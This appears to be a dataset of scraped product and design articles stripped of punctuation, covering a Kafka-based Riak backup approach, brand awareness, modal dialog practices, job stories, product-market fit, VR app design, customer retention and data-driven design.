shuttle the insert  updates  and deletes off site creating a copy of our transactions off site  If we need to restore the ring  we can then pull the Kafka data based on the user and dates  We rehydrate the Kafka topics with those messages so that our workers will bring the contact dataset up to date  This is a great solution for us because it gives us something which can be used to restore to any point in time and it puts no load on the production Riak Solr cluster for backup  It also uses current code paths so that it is extremely unlikely to break under future development   Look inside the box  In order to back up Riak we were able to rely on our existing development capabilities instead of 3rd party tools which were extremely wasteful  This proved to be very successful as there are no great solutions out of the box to back up Riak Solr   Since all our updates go through an async bus  solving for incremental backups was fairly simple and easy to maintain  If you re running all your updates through a pub sub system like Kafka  consider building your own incremental restores  You already have the developers and the capabilities to subscribe to the bus and the code to process the messages  so I d propose you reuse that knowledge and build your own flexible backup and restore system 
74,product,How to Increase Brand Awareness for a ProductEvery product needs significant brand awareness for it to catch on with the general masses  even the strongest products  And while it may be easy to assume that a great offering will sell itself  this is rarely  if ever  true  But how do you entice complete strangers to fall in love with your product  This guest post from Jeremy Raynolds  a member of the Founder Institute network  outlines how to position your company as one that will attract and keep its customers   Your company may offer a product of the best quality  but nobody will buy it until you make the consumers aware of the product you sell  Different marketing strategies and other options have to be implemented in order to make your product visible  In addition  do not make the quality of your product lower because it may turn away the consumers even if the product is a trendy one  Moreover  consider building a brand image that can make consumers loyal  The formula for success is simple    Appreciate Your Customers and They Will Appreciate Your Product   Here are some marketing tips and ways to promote your product that can answer a question  How to increase brand awareness    Read them and implement or simply broaden your knowledge   1  Website  Nowadays almost everybody has an access to the Internet  Therefore  it is recommended to develop a website where you can tell more about your product  its price  what makes it unique and why it is worth spending money on  In addition  a great idea is to hire a website developer that can help you to create an amazing website and  moreover  optimize it to make it appear high in Web search results  You may also contact the owners of the similar websites  with a similar production but not competitors  and ask them to place some ads to promote your company   2  Social media  Facebook and Twitter are among the most popular social networks that have forums where people discuss not only the purchases they made but also the items they want to buy  People become aware of your product when they read some comments on this product  However  an awareness should be positive because there are a lot of items that people order and receive in a very bad condition therefore this product has a bad reputation on the social networks  forums   Instagram is widely used for placing advertisements  You can try to contact a famous singer  actor or blogger and ask him her to post a photo with your product and write a comment about it below  Usually you have to pay a lot for these promotions  however  they are worth spending money on   3  Traditional methods  Although electronic communication grows fast  print media  magazines and newspapers  can work as well  Create advertisements that can quickly grab the consumers  attention and explain what the characteristics of the product are  Some newspapers want to encourage local businesses and therefore they can print a discounted or free ad for you   4  Charity  People like buying products that have a good reputation  Contribute to some charitable events  where your logo or name can be displayed  and local charities  Do not think that the money you spend on them will not help your company  It will   5  Stores  Place your product in stores with a high number of potential customers  Additionally  consider placing your product at eye level and making an attractive packaging to make your product appealing even for those  who do not plan to buy it   6  Freebies  Who does not love free stuff  Put the name of your brand in different items such as pens  pencils or small bags and give them at festivals or simply on the streets  However  do not save money on these freebies because the pen that is going to run out of ink quickly can only damage your reputation   7  Uniqueness  Do not be afraid to make your product having a fun brand identity  A little dose of comedy can make your product a unique and a memorable one  Take a look at the advertisements  examples of Dollar Shave Club and Old Spice to have a notion of a humorous brand promotions   8  Remarketing  Remarketing is great and you will be amazed by how much it works  People  who visited your site but did not buy anything  will see the ads of your product across the sites they visit  They will think that you have big budgets  because you spend so much money on advertisement  and that your brand is a large one  Thus  seeing the product offered everywhere  consumers may want to purchase it   9  Giveaways  Organize some competitive giveaways to increase brand recognition along with awareness and to attract attention   All in all  billions of brands want the public s awareness and attention and you are among them  If you are a small and new brand it may be hard to compete against the large corporations  However  everything is possible and in future you may become a popular brand if you will use PR  advertising  social media and other tricks that can increase brand awareness for your product  In addition  you may read an article about top 10 social media marketing tools for business promotion that can help you in creating a business strategy as well  We hope that brand awareness strategies above will help you to build a perfect brand image  Good luck   Jeremy Raynolds is a blogger and freelance writer for http   Edubirdie com  His credo is  Focus on the core problem your business solves and put out lots of content and enthusiasm  and ideas about how to solve that problem     The Brand image by Shutterstock 
75,product,Best Practices for ModalsBest Practices for Modals   Overlays   Dialog Windows  Modals  Overlays  Dialogs  whatever you call them it s time to revisit this UI pattern  When they first came on the scene  modal windows were an elegant solution to a UI problem  The first being that it simplifies the UI  the second  it saves screen real estate  Since then designers have readily adopted the modal window and some have taken it to the extreme  Modals have become the today s version of the dreaded popup window  Users find modals annoying and have been trained to instinctively and automatically dismiss these windows   Definition   A modal window is an element that sits on top of an application s main window  It creates a mode that disables the main window but keeps it visible with the modal window as a child window in front of it  Users must interact with the modal window before they can return to the parent application    Wikipedia  Usage  You may consider using a modal window when you need to   Grab the user s attention  Use when you want to interrupt a user s current task to catch the user s full attention to something more important   Need user input  Use when you want to get information from the user  Ex  sign up or login form   Show additional information in context   Use when you want to show additional information without losing the context of the parent page  Ex  showing larger images or videos   Show additional information  not in context   Use when you want to show information that is not directly related to the parent page or other options that are  independent  from other pages  Ex  notifications   Note  Do not use to show error  success  or warning messages  Keep them on the page   Anatomy of a Modal Window  Poorly implemented overlays can hinder task completion  To ensure your modal doesn t get in the way make sure to include the following   1  Escape Hatch  Give users a way to escape by giving them a way to close the modal  This can be achieved in the following ways   Cancel button  Close button  Escape key  Click outside the window  Accessibility Tip  each modal window must have a keyboard accessible control to close that window  Ex  escape key should close the window   2  Descriptive Title  Give context to the user with the modal title  This allows the user to know where he she is because they haven t left the original page   clicked on Tweet button   Modal title  Compose new Tweet  Gives context   Tip  button label  which launches modal  and modal title should match  3  Button  Button labels should have actionable  understandable names  This applies to a button in any instance  For modals  a  close  button should be present in the form of a labeled  close  button or an  x    Invision has clearly labeled buttons  Note  Don t make the button labels confusing  If the user is trying to cancel and a modal appears with ANOTHER cancel button  confusion occurs   Am I cancelling the cancel  Or continuing my cancel    4  Sizing   Location  A modal window should not be too big or too small  you want it juuuuust right  The goal is to keep context  therefore a modal should not take up the whole screen view  Content should fit the modal  If a scrollbar is needed  you may consider creating a new page instead   Location   upper half of the screen because in mobile view modal may be lost if placed lower     upper half of the screen because in mobile view modal may be lost if placed lower  Size   Don t use more than 50  of the screen for the overlay  5  Focus  When you open a modal use a lightbox effect  darken the background   This draws attention to the modal and indicates that the user cannot interact with the parent page   Accessibility Tip  put the keyboard focus on the modal  6  User Initiated  Don t surprise users by popping up a modal  Let a user s action  such as a button click  following a link or selecting an option  trigger the modal  Uninvited modals may surprise the user and result in a quick dismissal of the window   Modal initiated by clicking Log In  Modals in Mobile  Modals and mobile devices usually don t play well together  Viewing the content is difficult because modals either are too large  taking up too much screen space or too small  Add in elements like the device keyboard and nested scrollbars  users are left pinching and zooming trying to catch the fields of a modal window  There are better alternatives for modals and shouldn t be used on mobile devices   modal window done well   facebook  Accessibility  KEYBOARD  When creating modals remember to add in keyboard accessibility  Consider the following   Opening modal   The element which triggers the dialog must be keyboard accessible  Moving focus into the Dialog   Once the modal window is open  the keyboard focus needs to be moved to the top of that  Managing Keyboard Focus   Once the focus is moved into the dialog  it should be  trapped  inside it until the dialog is closed   Closing the Dialog   Each overlay window must have a keyboard accessible control to close that window   For more information on the list above check out Nomensa s blog article  ARIA  Accessible Rich Internet Applications  ARIA  defines ways to make Web content and Web applications more accessible   The following ARIA tags can be helpful in creating an accessible modal  Role    dialog    aria hidden  aria label  for more information on ARIA  check out Smashing s Magazine article  Also  remember low vision users  They may use screen magnifiers on monitors to enlarge the screen content  Once zoomed in the user can only see part of the screen  Here modals will have the same effect as they do in mobile   Conclusion  If people have been trained to automatically try to close modals  why would you want to use them   Getting the user s attention  keeping context and simplifying the UI are great benefits of modals  However  there are downsides as they interrupt the user flow and make it impossible to interact with the parent page by hiding the content behind the modal  Modal may not always be the answer  Consider the following when making your choice   Checklist  When do we show the modal   How do we show the modal   What does the modal look like   What information do we present and collect   There is an alternative UI component to modals  non modal or a ka  toast  term used by Google in Material Design   Microsoft   Check out my next post to learn more 
76,product,How We Design for TrustHow We Design for Trust A TEDTalk by Airbnb Co founder Joe Gebbia  Airbnb Co founder Joe Gebbia bet the company on the belief that people would trust each other enough to stay in one another s homes  How did Airbnb overcome the stranger danger bias  Through good design  Watch his TEDTalk to find out how   The following companion articles give a deeper dive into how we approach trust from a design and research lens   Designing for Trust by Charlie Aufmann  Experience Design Lead   Building for Trust by Judd Antin  Head of Research   and Riley Newman  Head of Data Science  
77,product,5 Tips For Writing A Job Story   Jobs to be DoneA Job Story is a powerful way to facilitate team conversation and discovery when designing products  They are meant to cut right to the job to be done by eliminating distractions  The job story encourages the product s design process to focus on context  causality and motivations instead of assumptions  subjectiveness  personas and implementations   Want more  Download a free PDF book about JTBD or buy it in paperback   kindle  As I write more job stories  I ve been paying attention to characteristics which make some stories better than others  When a story is well done  it helps me and my team cut right to what needs to be discussed and puts us all on the same page   making the product design process dramatically better   Here are 5 tips which will help when writing Job Stories   Refine A Situation By Adding Contextual Information Job Stories Come From Real People Not Personas Design Modular Job Stories Which Features  Solutions  Can Plug Into Add Forces To Motivations Job Stories Don t Have To Be From A Specific Point Of View  1  Refine A Situation By Adding Contextual Information  When David Wu described to me how a situation can capture a whole set of conditions  it struck a chord with me  When I add more context to a situation  I ve found that it s easier to design a working solution which also handles any anxieties which can push a customer away from using a product or feature   Let s compare   When I want something to eat   When I m in a rush and want a something to eat   When I m in a rush  I m starving and want something to eat   When I m in a rush  starving  need something I can eat with one hand while  on the go   am not sure when the next time I ll be able to eat     The more context we have for the situation  the better I can design a solution  In version  1  a sit down restaurant will work  In version  4  perhaps a slice of pizza or snickers bar will work best   2  Job Stories Come From Real People Not Personas  Because they are a mashup of assumptions and attributes  personas can have a destructive effect on product design  They can give a false sense of knowing the customer and thus can really leave gaps in design  For example  you can t ask a persona about their anxieties  why they chose Product A vs Product B  what else was going on when they chose Product A vs Product B  or that when they first opened your app they didn t know what to do first    Job Stories can only come from real customer interviews  Before designing a feature or new product  you must talk to real people and uncover all the anxieties and contexts which were in play when they used your or a competitor s product   If you are interested in learning about techniques on how to conduct an interview  listen to the The Mattress Interview with Chris Spiek and Bob Moesta  Chris  Bob and Ervin also have a Udemy course on jobs to be done customer interviews   Another reason why some favor personas is because they don t know how else to organize all the information they get about or from their customers  How to organize job stories will be addressed in a future article   3  Design Modular Job Stories Which Features  Solutions  Can Plug Into  When designing job stories  it s important to not commingle them with solutions  This is another important distinction from user stories which encourage defining implementation   When commingling personas   or situations   and solutions    Below is from a source describing how to write effective user stories  The author encourages to also create sub stories which  add detail  to help develop the user story  Here is an example   As a user  I can backup my entire hard drive    and after adding detail    As a power user  I can specify files or folders to backup based on file size  date created and date modified   and     As a user  I can indicate folders not to backup so that my backup drive isn t filled up with things I don t need saved   Given the examples above  suppose the power users didn t care much to specify which files or folders to back up bases on file size  date created    In this case how do you figure out what went wrong  Is your persona wrong  Is the feature wrong  Is it the wrong feature for the persona   Breaking out situations   jobs   and solutions   The bottom line here is that when jobs are seen as separate from solutions  you notice that they can be explored differently and at different times  Another benefit of modular stories and solutions is how you can begin to see where jobs overlap and several jobs can end up sharing a common solution   How job stories relate to solutions and other job stories is a topic onto it s own  In the mean time  start off with visualizing the relationship between job stories and features like this   The last image references what I call a Situational Segment  It s an idea I ve been thinking about lately and is a topic that needs to be explored on it s own   4  Add Forces To Motivations  Another idea from David Wu is to include forces with motivations  In the job story format of Situation   Motivations   Expected Outcomes  the Motivation stage can be augmented by adding pull and push forces  Adding forces to a motivation is much like adding context to a situation  Let s consider the mayday feature by amazon  as Ross Belmont put it   When I m using my tablet and encounter a problem  I want to get help right away so I can finish what I started   Let s stick with the motivational part  I want to get help right away and add some forces   Situation   When I m using my tablet and encounter a problem    Motivation   I want to get help right away   Force  I m irritated because I was in the middle of something   Force  I m nervous I won t finish what I was just doing   Force  I get nervous asking for help   Force  Asking for help might make me look stupid   Force  I m shy about showing what I m working on to someone else   Expected Outcome   So I can finish what I started   When a story adds forces  we can then design solutions which help reduce forces that push customers away from a product or feature and increase the forces that pull them towards a product or feature  In Amazon s case  they could   Reassure that customers don t have to wait long to get help    I m nervous I won t finish what I was just doing    Ensure that customers can choose how much access the customer support rep has to your tablet    I m shy about showing what I m working on to someone else    Remind customers how common it is to ask for help   Asking for help might make me look stupid   5  Job Stories Don t Have To Be From A Single Point Of View  Lately  I ve been experimenting with the idea of not restricting stories to the point of view of just one person  Instead  I ve been writing stories from a third person point of view   When   When someone approaches a bank for a home mortgage and fills out an application   Motivation   The applicant wants to know if the application is accepted or not   The banker wants to make sure that the application is filled out correctly   The bank wants to check if the applicant has acceptable credit history   Expected Outcome   So that a home mortgage is quickly given to a low risk person  which the bank feels confident it will profit from   Again  I m experimenting with these so I d love feedback on what people think about this  So far  3rd person stories do well when a product deals with multiple parties  such as a real time bidding site like eBay   Learn more  I m still working with job stories in my product design and I m sure the more the concept is put into practice  adjustments will be made and it will continue to be built upon  As these come up  I ll continue to comment about it   Your Job Story Needs A Struggling Moment  5 Tips For Writing A Job Story   Get a deeper understanding of JTBD and Job Stories from my book When Coffee and Kale Compete   Learn more about JTBD in When Coffee and Kale Compete  You can download it as a free PDF  or buy it in paperback   kindle right here  You can also read it online here   If you have more questions about Jobs to be Done  or want help applying JTBD concepts to your business or startup  contact me 
78,product,Oprah versus Spock  Advice from Dan Olsen and The Lean Product Playbook20 Flares 20 Flares     Product Market Fit  is a concept that every start up founder knows is important  but many have trouble achieving or even defining  In The Lean Product Playbook  author Dan Olsen details a six step process to achieving product market fit   Determine your target customer Identify underserved customer needs Define your value proposition Specify your MVP feature set Create your MVP prototype Test your MVP with customers  Dan helps CEOs and product leaders build better products and stronger product teams as a hands on consultant  trainer  and coach  At the most recent Mind The Product conference in London  Dan gave a popular workshop called  How to Achieve Product Market Fit   I spoke to Dan recently in advance of Lean Startup Week in San Francisco  where Dan taught a masterclass on product market fit   In his book  Dan shows a great image showing a  Hypothesize Design Test Learn  cycle  I asked him about some of the challenges in going from  Test  to  Learn     Going from  Test  to  Learn  requires that you conduct your user tests in a way that generates actionable learning  A big challenge that product teams face is the quality of their user tests  One of the biggest drivers of the quality of a user test is how the moderator asks questions   For example  let s suppose that after a customer tries to use a feature in a user test  I ask her   That was easy  wasn t it   I ve pretty much set her up to say yes  That is an example of a leading question  Good user testing moderators avoid leading questions like that  A better question in that situation would be   Could you please tell me how you felt when you were trying to use that feature     Let s suppose that after she uses another feature in the user test I ask her   Did you like that feature    Now  I m not leading her to say yes  necessarily   but I am pretty much limiting her choices of responses to yes or no  That is a closed question  It is much better to avoid closed questions and ask open ended questions instead  A better question in that situation would be  Could you please tell me what you think about that feature    Use open ended  non leading questions for better learning from user tests    Dan s work focuses a lot around on the idea of product market fit  which can be a huge challenge for start ups who have little customer signal to know if their ideas  fit  or if they should refocus  What is Dan s advice is for companies struggling to understand if their product has achieved  fit     The market consists of your target customer and their underserved needs  Your product consists of your value proposition  your feature set  and your user experience design  How well your product assumptions  decisions  and execution resonate with the market determines your level of product market fit   The ultimate measure of product market fit is retention rate  Retention rate tracks the percentage of users who return to use your product over time  You can get people to sign up for your product with a slick landing page  but if they come back again and again then you can be confident that you are creating value for customers by meeting their needs in a way that is better than other alternatives   Some retention curves drop to zero  which means you lose all of those users over time because your product isn t sticky enough  Other retention curves flatten out to a certain value  say 5  of your initial users  That  terminal value  of your retention curve is a direct measure of product market fit  Over time  as you learn more about your market and improve your product  you want to see the retention curve for newer cohorts of users move up over time    The Minimum Viable Product  MVP  is one of the key learning methods described in the Lean Startup  The MVP has been adopted by many start ups as a way to test business ideas  and has been translated to MVPs for new features and products for the enterprise as well  How can companies best use MVPs to learn what to build    I agree that companies should test their assumptions before building their product  In my book  I explain the important differences between qualitative and quantitative learning methods  To highlight the difference  I like to refer to qualitative methods as the  Oprah  approach and quantitative methods as the  Spock  approach   Many people have a preference for Spock  and I understand the allure of trying to  prove  things with numbers  However  the reality is that qualitative methods are much more effective when you define a new product  You learn who your customers are  what their needs are  and how your product might be able to meet those needs better than the existing alternatives  You of course want to take an iterative approach  testing your assumptions with one wave of customers at a time  Interactive prototypes are a great tool for doing this   As you iterate from wave to wave revising and improving your hypotheses  you want to see fewer negative comments and questions from users and more positive feedback from users  Ideally  to avoid people just being nice to you  you manage to get them to have some skin in the game  You can ask for time  are they willing to schedule a future meeting to give you feedback on your next revision  You can ask for money  are they willing to pay for early access to the product  Or the skin can be reputation  are they willing to refer you to two of their colleagues to solicit their feedback on the product    Qualitative data plays an important role in the Lean Product Playbook  How should companies use this data  Should this knowledge be shared among the company or team  or does Dan think it s the PM s job to filter it    The qualitative  aka  Oprah   approach is very important when you re building a new product or feature  In general  I believe that information  especially information from customer research  should be made accessible and shared broadly   That being said  it is valuable for someone to synthesize the learning  If anyone wants to read the full notes or watch the videos from user tests  that s great  But they shouldn t have to do that to understand the important takeaways  In my mind  the PM isn t filtering the raw data but rather trying to pattern match and synthesize across the data to extract knowledge from it    Finally  does Dan recommend any specific tools for doing work around product market fit and learning from MVPs    Of course  I recommend the frameworks in my book  I m also a fan of tools that let you easily create and iterate clickable or tappable wireframes  such as Balsamiq  These tools help the team work through their UX design quickly  I m also a fan of InVision  which lets you take your design mock ups  from Sketch  Photoshop  or Illustrator  and create clickable or tappable prototypes that are great for user tests    You can also sign up for The School of Little Data  our free email courses to learn how to use your data to collaborate with your team 
79,product,Designing Facebook for Mobile VR   Gabriel Valdivia   MediumDesigning Facebook for Mobile VR Lessons from the making of the Facebook 360 app for Gear VR The mission of the Facebook Immersive Design team is to enable people to experience moments as if they were there  We believe the ability to tell and experience stories unbounded by a rectangular  frame  allows people to connect more deeply with those moments and ultimately each other  We ve built support for 360 photos and videos on all platforms and have seen more than 25 million 360 photos and more than 1 million 360 videos posted on Facebook to date  Although Facebook hosts a lot of great 360 content  it can be easy to miss in your News Feed and hard to find when you have a headset ready  Introducing Facebook 360 For the past few months  I ve been working on designing the next step in making 360 photos and videos even more immersive and easier to discover  the Facebook 360 app for Samsung Gear VR  powered by Oculus  It is the first dedicated Facebook media app for the Gear VR platform  a destination to view 360 photos and videos from Facebook in VR   Facebook 360 is a one stop shop for catching up on what you may have missed from your friends and pages you follow  immersing yourself in the 360 photos and videos you ve saved while finding something new to enjoy  The app features four sections     Explore  The most popular 360 content on Facebook from media companies  organizations  and individual creators     Following  360 content from friends and Pages you follow on Facebook     Saved  360 content you save from News Feed on mobile and desktop right in the app  ready for you to enjoy at a more convenient time     Timeline  Your memories ready to be relived in a new way through the 360 photos and videos you ve shared  We focused on providing people with a coherent experience in Gear VR that mirrors people s traditional Facebook usage  We ran weekly research sessions with participants of different backgrounds to validate our assumptions along the way  Facebook as a Destination When designing the app  it became clear that the context of use for 360 photos and videos from Facebook is very different in VR  People are likely to visit Facebook on their phones or desktop many times a day  but VR sessions are typically longer and more deliberate  users typically set time aside for more immersive experiences 
80,product,Customer Retention Hacking  How to get Users to Commit279 Flares 279 Flares    Customer retention is like dating   You don t interact with your significant other the same way on your first date as you do on your 50th or 200th date  Similarly  giving a customer a great experience on day one isn t going to be the same as on day 50  In order to boost retention numbers and make this relationship last  it is important to address the problems specific to the user s journey   First  let s address the relationship stages  Your customer goes through three phases with your product   The get to know me phase  Think of this as the first date for new users  First impressions are everything  so you want to make sure you show them what you re all about without overwhelming them  The casual dating phase  These are the seasoned users who are pretty familiar with your app  They are content with the experience and have started forming habits around it  The serious dating phase  These are the power users  They re serious about your app and can t live without it  This involves the user using the app for its maximum capabilities and telling all their friends about it   Each phase requires a different type of retention strategy  Adjusting your onboarding walkthrough isn t going to keep users who have been using the product for eight months from churning  Just like how improving the stickiness of your features isn t going to improve a user s first experience with your app   Here s my breakdown of the three stages of customer retention and how you can address churn at each stage   New Users  0 7 days   The purpose of early stage retention is to get a user to use your app more than once  This is one of the most important parts of the customer journey because it determines how much of a customer base sticks around for the next two stages  Your job is to get as many customers to have a great first impression as possible  so that you have an opportunity to win them over for the long haul later   So say this is a graph of your app s early retention rate   Within just one day  you lose 75  of users  At first glance  this is catastrophic  but hidden in this graph is good news too  The users who did make it past one day seem to continue using the product  That means you have to fix something about your first time user experience  Let s say  you fix some of your in app onboarding cues  and manage to lift your retention by 5    This looks like just a slight lift  but a lift of 5  in your customer retention can mean up to a 25  revenue increase  Big companies would kill for a profit increase of that size  so improve your early stage retention early on  and you ll get that high revenue while you still have a relatively small user base   Improve user onboarding  The best way to improve your early stage retention is to improve your user onboarding experience  According to Basecamp CEO Jason Fried  your onboarding should focus on  here s what you can do with our product   rather than  here s what our product can do   The first is user centric  the second is product centric   To create a user centric experience  your goal is to create Aha  moments the moment where they  get  why your app is so useful  for the most users as early on as possible  Here s how   Form an informed hypothesis based on existing data  Look at behavioural analytics of long time customers to glean what the most popular features and use cases of your app are  and make several estimations as to where your users experience Aha  moments  A B test different features to test hypotheses  Create several onboarding workflows that emphasize different features of your app and see which ones get users to use the app a second and third time  Survey after onboarding  The Aha  moment is an elusive thing to nail down  so the best way to work your onboarding around it is to learn when successful customers reached theirs  You might have been leading only the most patient users to find their Aha  moment  instead of pointing all users to your stickiest feature sooner   While your product s core value might be obvious to you  you can t just go out and claim that it ll make your users lives  better  You have to lead them to that conclusion on their own   Seasoned Users  8 90 days   During the middle stage retention period  users get to know your product on a whole new level  digging through all the features and possible use cases  You can t control everything in your app  but you can work to pinpoint friction and eliminate it   You might look at an acquisition cohort analysis and see a steady decrease in retention month to month  But a steady decrease in active users as shown in the graph below doesn t give you any indication as to where users are losing interest   The unsexy truth is that churn is a lagging indicator especially in the middle retention period  A user might have used your app three times in the first week  but never made it a habit because the login process is too damn difficult  It took a few months of them staring at their cluttered home screen before deciding to unsubscribe from your service  To keep users engaged at this stage  you ll need to dive deeper than churn   Look at How Users Spend Their Time  Once you re plummeting into consistent customer desertion  it s probably too late to backtrack and convince users to stay  But there are ways to get a better understanding of your users  behaviours and where they re encountering friction in your app  Here are the analytics you can look at to help locate pain points before they cause churn   Screen visits  See which screens users spend a lot of time on  and which they avoid  This will help you re evaluate the UI of potentially offputting screens   See which screens users spend a lot of time on  and which they avoid  This will help you re evaluate the UI of potentially offputting screens  Screen flow  These analytics will show you how many clicks it takes for users to get to the part of the app they use the most  Or  alternatively  whether their behaviour points them to the wrong page at the wrong time  high bounce rates   These analytics will show you how many clicks it takes for users to get to the part of the app they use the most  Or  alternatively  whether their behaviour points them to the wrong page at the wrong time  high bounce rates  Overall time in app  Users who are spend little or no time in your app haven t found a lasting value in your product  This might require nudging through re engagement emails  or bringing in back up help from sales or customer support   There are no quick fixes at this stage of the user lifecycle  There s no dancing around a bad UX  so use all your resources to make sure your users are happy with your product  Use behavioural analytics to make informed product decisions  so that your users can have a better product experience and stay long enough to gain value   Power Users  91  days   Once users are active 90 days or more  they re reliable users who are happy to continue using your product  Now  your goal is to take those seasoned committed customers and drive them even deeper into your product  transforming them into power users   You can do this by working to increase customer value over time  That means your users will upgrade  use more products  or even be an advocate for your brand  This will help you work towards achieving negative churn the most powerful growth weapon according to Tom Tunguz  partner at venture capital firm Redpoint Ventures  This means that your revenue will grow regardless of how many customers you acquire   Source  tomtunguz com  In the chart above  each colour is a cohort of users who started at different times  If you constantly work to increase each cohort s value  they will build on top of each other and considerably increase revenue in the long term  This way  not only do you not need to worry about acquiring customers to survive  but you won t even need to acquire customers to grow   Constantly Try to Further Enamour Your Customers  If your customers like your app  you re off to a good start  But you want your customers to love your app  That transition requires you to offer your users even more value than they had signed up for  They might have thought they were getting a checklist app  but what they actually got was an app that they used for all their communication outreach and kept track of benchmarks and goals   Here are three ways to give your users more value   Upsell wisely  Make recommendations for bigger plans or different products in your platform  but make sure you don t overdo  The line between friendly suggestion and pestering sales email is very fine  Make it user centric  and consider easing them into it with a free trial   Make recommendations for bigger plans or different products in your platform  but make sure you don t overdo  The line between friendly suggestion and pestering sales email is very fine  Make it user centric  and consider easing them into it with a free trial  Harness the power of referral  Referral programmes are usually taken advantage of in the B2C world  but that only makes it an even more powerful tool for B2B  Not only do like businesses network with like businesses  but users who refer also tend to feel even more invested in the app they recommended   Referral programmes are usually taken advantage of in the B2C world  but that only makes it an even more powerful tool for B2B  Not only do like businesses network with like businesses  but users who refer also tend to feel even more invested in the app they recommended  Build for your VIPs  Establish a relationship with the top 20  of users  and get their suggestions for product modifications  They are basically your buyer persona  so not only will they become more valuable as they use your new product  but you ll drive other users who hadn t spoken up deeper into your app   You want your app to achieve long term success  so you have to strive to create something that your users can t live without  Give them value  and you ll get value in return   Not Easy  but Worth It   A lot of things have to go right for a relationship to work out  and your relationship with your customers is no exception  There s no quick band aid that can make a difference in the long term  Rather  customer retention consists of many  many layers each of which can determine your success   Improve your onboarding  and you will have much more users that could grow in value 90 days down the line  But ignore users in their third month of using your app  and don t be surprised if many of them move to the next hot app on the market  Put in the work to get to know users and identify pain points  and the relationship will be well worth it 
81,product,How to use data to improve your designUsed to going with your gut  What about following your heart  Do you love to flip a coin when you face a tough decision   All of these methods may occasionally lead you in the right direction  but their effectiveness just can t compare to the use of real  actual data   Let s dig in and take a look at some of the most impactful ways that we  as designers  can use data to improve our designs   What counts as data   We need the freedom to be more liberal with what we consider data  It s not just the numbers that matter to us some of the  data  that we look at might make traditional data scientists cringe   For example  I often like to run surveys asking new customers to list adjectives they d use to describe their experience during the onboarding process  Traditional analysts hate these kinds of data as they aren t easy to quantify  But to designers  it can be far from useless   After all  we often face unique challenges and therefore earn the right to put our own spin on the art and science of data analysis   There are 2 major types of data we ll consider going forward   Quantitative data Qualitative data  Quantitative data  Big data  Numbers  Charts and graphs   Put simply  quantitative data is the numerical data regarding the  who    when    what   and  where    Think Google Analytics  Think demographics   This type of information is highly relevant to designers  After all  knowing your audience is a prerequisite to designing something that will solve at least one of their problems   Qualitative data  Qualitative data is best defined as non numerical information regarding the  how  and  why    Why did someone choose your product  How do they use it  How is your app perceived by your users   Qualitative data may be harder to visualize  but it can still play a critical role in your design process  Just look at how Sentiment Viz shows the wide range of emotions expressed by Twitter users regarding any keyword you want to dig into   Knowing how many people visit your site is great information  But imagine the value of knowing why they visit your site in the first place   Or even better  how the experience made them feel   Understanding the  why  allows us to create more engaging experiences for our users and thus increase the overall value of our product or service   How to design with data  Now that we ve established what data means to designers  let s talk about how we can actually use data to accomplish goals and delight customers   Start with a question  Data can seem overwhelming to the uninitiated  Who hasn t gotten lost or sidetracked in Google Analytics  It can happen easily if you don t go in there with a specific purpose  There s just so much fascinating stuff to look at   To focus your efforts  start your data analysis with a question  What are you looking to find  Don t just peruse data looking for any old insight have a specific goal in mind   A few questions I find myself frequently asking   What impact has our new landing page had on our bounce rate   How did changing the copy of a CTA affect our conversion rate   What keywords do my users actually type into Google to land on my site   Which of our landing pages converts the most traffic   What you do with this data will vary depending on a number of factors  But taking the last question as an example  it s easy to see how we could apply this to our design decisions   We can better determine what our audience wants to see on our site  what images and messaging truly connect with them  and how we can emphasize our value on other landing pages   Build mockups with real data  Designers often use  perfect  fake data in their mockups  such as   A line of text that s just the right length to display the layout the designer has in mind  A number that s nice and rounded  when a live input might include decimals  Beautifully edited and Photoshopped images cropped to ideal proportions  The real world is imperfect  so design with real data   Edge cases happen in the wild we can t forget that when we start building mockups   When designers use real data in mockups  the work is constrained by the same realities that will inform the final design and engineering decisions   For example  if you re designing a newsfeed application  you might create a mockup with 3 rows of 2 news items above the fold  You want the news items to be complete snippets that don t require a click through   In your mockup  each news item lines up just right and you get those 6 snippets above the fold  Spoiler alert  that only worked because you crafted filler snippets that fit the design layout you wanted   When you go to test it in the real world  you ll find that your layout doesn t look the same and that some news items will get bumped below the fold due to varying length   As you can rightly extrapolate  this kind of conflict can arise with all kinds of variable fields in apps  Without using real customer data  you could often encounter some serious formatting errors that hurt the user experience   This is why it s so important to consider real data during the design process  Employing this methodology forces designers to empathize with end users in advance of building the actual product   The last thing you want to do is build an app or a website to near completion without having ensured that when it s let out into the wild  the design you labored over will actually be functional and in tact   A B testing  A B testing is the most effective way to implement data analysis into your design practices   Is your CTA converting visitors well  Would it do better if it were green instead of red  How about the layout of your landing page   A B testing is the easiest way to do this  It s a simple process  and one that you should pretty consistently be using to run experiments   At its most basic level  A B testing is simply changing one element of a page or app  and leaving the rest the same  Then you split traffic between the 2 experiences  and measure some KPIs   A B testing should be an always on part of your design process  Finishing the first version of a design isn t the last step  You should always be looking for ways to experiment with your designs  Remember  we want to let data not hunches guide our decisions   Semantic differential surveys  It s hard to quantify things like  sentiments   but we need to at least try if we re going to craft truly memorable user experiences  Getting your users to fill out surveys can be challenging  but it s worth it for the insights it can provide   How you get them to fill it out may depend a bit on your specific audience and your relationship with them  but in general I d recommend email be your main go to   Emailing survey asks is the most common method you ll see used  and for good reason  Email engagement is generally much higher than other channels  and it s an easy and cheap way to get the recipient s attention   If you re having trouble getting feedback  consider throwing in an incentive if people take the time to fill it out  At the very least  express sincere thanks  and lead into the  ask  by explaining why it s important for you and your team to hear from them   Back to the task at hand  the goal of a semantic differential survey is simple  You present multiple options and ask for viewers to rate them on a sliding scale for various descriptive adjectives  These can be highly effective when done right   If you were to run a standard survey and ask  Do you think your manager is a fair person    the participant will be primed to feel a specific way due to the adjective you used in your question   On the other hand  you could try a more open ended presentation of the question  Like this   Looking at it this way  there are no implications or assumptions being conveyed  The goal here is to get at a person s true sentiments about the subject matter   You can take this a step further and remove the option for a neutral answer  It may frustrate some users  but it ll force them to pick a side and get you even more in depth answers   The applications are nearly endless and you can definitely take this in whatever direction best suits your own situation and needs   Maybe you want to get visitor s opinions on the impression they get of your company from the main landing page  Maybe you want to hear how subscribers felt when they first accessed content that was formerly behind a paywall  Or maybe instead you d like to know if users felt like they were guided through the process after clicking  purchase    Did the design of your company s sign up flow keep them involved  Why do people drop out of your sales funnel  What was their sentiment of your company when they did   These are all questions we can address through semantic differential surveys  Try them out  and you ll be amazed by the feedback you get and how much better you understand your users afterwards   Giving it a go  Mentioned above were only a fraction of the ways we can use data to both improve and drive our design process   Take the time to look at the numbers before you start designing  Your users and visitors will thank you 
